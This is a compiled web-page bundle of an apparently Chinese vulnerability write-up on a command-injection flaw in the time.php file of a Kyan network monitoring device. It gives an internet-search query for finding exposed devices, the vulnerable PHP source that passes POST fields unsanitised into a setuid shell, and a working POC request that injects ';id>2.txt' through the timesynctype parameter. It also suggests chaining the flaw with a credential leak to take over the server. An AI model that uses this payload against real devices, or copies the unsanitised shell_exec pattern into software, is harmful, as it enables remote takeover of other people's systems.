import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as t}from"./app-58e4a7d6.js";const l={},s=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Kyan
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Kyan设计&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191753857.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件: <code>/time.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
require_once &#39;functions.php&#39;;
require_once &#39;international.php&#39;;

session_start();
auth_check();

//showHeader(&#39;Route&#39;, array(&#39;table.css&#39;));
if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;)
{
	if(!user_is_admin())
	{
		showErrMessage(&quot;permission denied&quot;);
		exit;
	}
	$timesynctype = $_POST[&quot;timesynctype&quot;];
	if($timesynctype!=&quot;client&quot;)
	{
		$output = shell_exec(&quot;/bin/bashsuid -p -c \\&quot;/usr/sbin/ntpdate &quot; .$timesynctype. &quot;\\&quot;&quot;);
		showMessage($output);		
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;hwclock --systohc\\&quot;&quot;);
	}else
	{
		$ctime = $_POST[&quot;ctime&quot;];
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;date &quot; .$ctime. &quot;\\&quot;&quot;);
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;hwclock --systohc\\&quot;&quot;);
	}
}
        echo &quot;&lt;html xmlns=\\&quot;http://www.w3.org/1999/xhtml\\&quot;&gt;\\n&quot;;
        echo &quot;  &lt;head&gt;\\n&quot;;
        echo &quot;    &lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=UTF-8\\&quot; /&gt;\\n&quot;;
        echo &quot;    &lt;meta http-equiv=\\&quot;Content-Style-Type\\&quot; content=\\&quot;text/css\\&quot; /&gt;\\n&quot;;
        echo &quot;    &lt;meta http-equiv=\\&quot;Content-Script-Type\\&quot; content=\\&quot;text/javascript\\&quot; /&gt;\\n&quot;;
        echo &quot;    &lt;link type=\\&quot;text/css\\&quot; rel=\\&quot;stylesheet\\&quot; href=\\&quot;./templates/clean.css\\&quot; title=\\&quot;PSI_Template\\&quot;/&gt;\\n&quot;;
        echo &quot;    &lt;title&gt;time&lt;/title&gt;\\n&quot;;
	echo &quot;&lt;style type=\\&quot;text/css\\&quot;&gt;&quot;;
	echo &quot;th, td, h3 {&quot;;
	echo &quot;font-size: 12px;&quot;;
	echo &quot;}&quot;;
	echo &quot;&lt;/style&gt;&quot;;
        echo &quot;  &lt;/head&gt;\\n&quot;;	

//print_html_begin(&quot;time&quot;);
?&gt;
&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
//因程序执行耗费时间,所以时间并不十分准确,误差大约在2000毫秒以下
var xmlHttp = false;
//获取服务器时间
try {
  xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
} catch (e) {
  try {
    xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
  } catch (e2) {
    xmlHttp = false;
  }
}

if (!xmlHttp &amp;&amp; typeof XMLHttpRequest != &#39;undefined&#39;) {
  xmlHttp = new XMLHttpRequest();
}

xmlHttp.open(&quot;GET&quot;, &quot;null.txt&quot;, false);
xmlHttp.setRequestHeader(&quot;Range&quot;, &quot;bytes=-1&quot;);
xmlHttp.send(null);

severtime=new Date(xmlHttp.getResponseHeader(&quot;Date&quot;));

//获取服务器日期
var year=severtime.getFullYear();
var month=severtime.getMonth()+1;
var date=severtime.getDate();
//获取服务器时间
var hour=severtime.getHours();
var minu=severtime.getMinutes();
var seco=severtime.getSeconds();
//获取客户端时间
localtime=new Date();
//取得时间差
var jtime=Math.abs(localtime.getTime()-severtime.getTime());
var jdate=jtime/(24*60*60*1000);
var jhour=jtime%(24*60*60*1000)/(60*60*1000);
var jminu=jtime%(24*60*60*1000)%(60*60*1000)/(60*1000);
var jsecond=jtime%(24*60*60*1000)%(60*60*1000)%(60*1000)/1000;

//格式化输出客户端时间
function getClientTime(){
localtime=new Date();
var cyear=localtime.getFullYear();
var cmonth=localtime.getMonth()+1;
var cdate=localtime.getDate();
var chour=localtime.getHours();
var cminu=localtime.getMinutes();
var cseco=localtime.getSeconds();

ccyear=addZero(cyear);
ccmonth=addZero(cmonth);
ccdate=addZero(cdate);
cchour=addZero(chour);
ccminu=addZero(cminu);
ccseco=addZero(cseco);

 document.getElementById(&quot;clienttime&quot;).innerHTML=ccyear+&quot;-&quot;+ccmonth+&quot;-&quot;+ccdate+&quot; &quot;+cchour+&quot;:&quot;+ccminu+&quot;:&quot;+ccseco;
 document.getElementById(&quot;ctime&quot;).value= ccmonth+&quot;&quot;+ccdate+&quot;&quot;+cchour+&quot;&quot;+ccminu+&quot;&quot;+ccyear+&quot;.&quot;+ccseco;
}
//格式化输出服务器时间
function getSeverTime(){
  seco++;
 if(seco==60){
  minu+=1;
  seco=0;
  }
 if(minu==60){
   hour+=1;
   minu=0;
 }
 if(hour==24){ 
  date+=1;
  hour=0;
 }
//日期处理
if(month==1||month==3||month==5||month==7
||month==8||month==10||month==12)
 {
  if(date==32)
  {
   date=1;
   month+=1;
   }
 }else if(month==4||month==6||month==9||month==11){
  if(date==31){
   date=1;
   month+=1;
   }
 }else if(month==2){
   if(year%4==0&amp;&amp;year%100!=0){//闰年处理
    if(date==29){
     date=1;
     month+=1;
    }
   }else{
    if(date==28){
     date=1;
     month+=1;
    }
   }
 }
 if(month==13){
 year+=1;
 month=1;
 }
 sseco=addZero(seco);
 sminu=addZero(minu);
 shour=addZero(hour);
 sdate=addZero(date);
 smonth=addZero(month);
 syear=year;
 
 document.getElementById(&quot;servertime&quot;).innerHTML=syear+&quot;-&quot;+smonth+&quot;-&quot;+sdate+&quot; &quot;+shour+&quot;:&quot;+sminu+&quot;:&quot;+sseco;
 setTimeout(&quot;getSeverTime()&quot;,1000);
 setTimeout(&quot;getClientTime()&quot;,100);
}

function addZero(num) {
num=Math.floor(num);
return ((num &lt;= 9) ? (&quot;0&quot; + num) : num);
}
function updatetime()
{
	return true;
}
&lt;/script&gt;

&lt;body onLoad=&quot;getSeverTime();&quot;&gt;
&lt;table style=&#39;width:500px&#39; border=&#39;0&#39; align=&#39;center&#39; cellpadding=&#39;3&#39; cellspacing=&#39;1&#39;&gt;
&lt;th colspan=&quot;2&quot;&gt;&lt;?php echo lang_get(&#39;Timer&#39;); ?&gt;&lt;/th&gt;
&lt;tr &gt;&lt;td align=&#39;right&#39; width=50%&gt;&lt;?php echo lang_get(&#39;System time&#39;)?&gt;&lt;/td&gt;&lt;td align=&#39;left&#39;&gt;&lt;div id=&quot;servertime&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr &gt;&lt;td align=&#39;right&#39;&gt;&lt;?php echo lang_get(&#39;Client time&#39;)?&gt;&lt;/td&gt;&lt;td align=&#39;left&#39;&gt;&lt;div id=&quot;clienttime&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr &gt;&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;
&lt;form name=&quot;Form1&quot; method=&quot;post&quot; action=&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]?&gt;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;cdate&quot; id=&quot;cdate&quot; value=&quot;&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;ctime&quot; id=&quot;ctime&quot; value=&quot;&quot;/&gt;
&lt;?php echo lang_get(&#39;Sync Source&#39;);?&gt;:
&lt;select name=&quot;timesynctype&quot; id=&quot;timesynctype&quot; &gt;
&lt;option value=&quot;time.windows.com&quot; selected=&quot;selected&quot;&gt;time.windows.com&lt;/option&gt;
&lt;option value=&quot;time.nist.gov&quot;&gt;time.nist.gov&lt;/option&gt;
&lt;?php 
/*$system_lic_file = &#39;/mnt/licenses/system/system.dat&#39;;
$bsynctoclient=false;
if(file_exists($system_lic_file))
{
	$output = shell_exec(&quot;/bin/bashsuid -p -c \\&quot;openssl bf-cbc -K 000102030405060708090A0B0C0D0E0F -iv 0102030405060708 -d -in /mnt/licenses/system/system.dat |grep -v \\&quot;^;\\&quot;|grep Expire\\&quot;&quot;);
	if($output == &quot;&quot;)
	{
		$bsynctoclient = true;
	}else
	{
		$bsynctoclient = false;
	}
	
}
if($bsynctoclient)
{*/
	echo &quot;&lt;option value=\\&quot;client\\&quot; &gt;&quot;.lang_get(&#39;PC Client&#39;).&quot;&lt;/option&gt;&quot;;
/* } */

?&gt;

&lt;/select&gt;
&lt;input  type=&quot;submit&quot; name=&quot;update&quot; id=&quot;update&quot; value=&quot;&lt;?php echo lang_get(&#39;Update Now&#39;);?&gt;&quot; /&gt;
&lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
//print_html_end();
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中需要注意的地方</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;)
{
	if(!user_is_admin())
	{
		showErrMessage(&quot;permission denied&quot;);
		exit;
	}
	$timesynctype = $_POST[&quot;timesynctype&quot;];
	if($timesynctype!=&quot;client&quot;)
	{
		$output = shell_exec(&quot;/bin/bashsuid -p -c \\&quot;/usr/sbin/ntpdate &quot; .$timesynctype. &quot;\\&quot;&quot;);
		showMessage($output);		
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;hwclock --systohc\\&quot;&quot;);
	}else
	{
		$ctime = $_POST[&quot;ctime&quot;];
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;date &quot; .$ctime. &quot;\\&quot;&quot;);
		shell_exec(&quot;/bin/bashsuid -p -c \\&quot;hwclock --systohc\\&quot;&quot;);
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>参数均可控，构造POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /time.php

timesynctype=;id&gt;2.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191753984.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),d=[s];function u(v,a){return i(),n("div",null,d)}const r=e(l,[["render",u],["__file","Kyan 网络监控设备 time.php 远程命令执行漏洞.html.vue"]]);export{r as default};
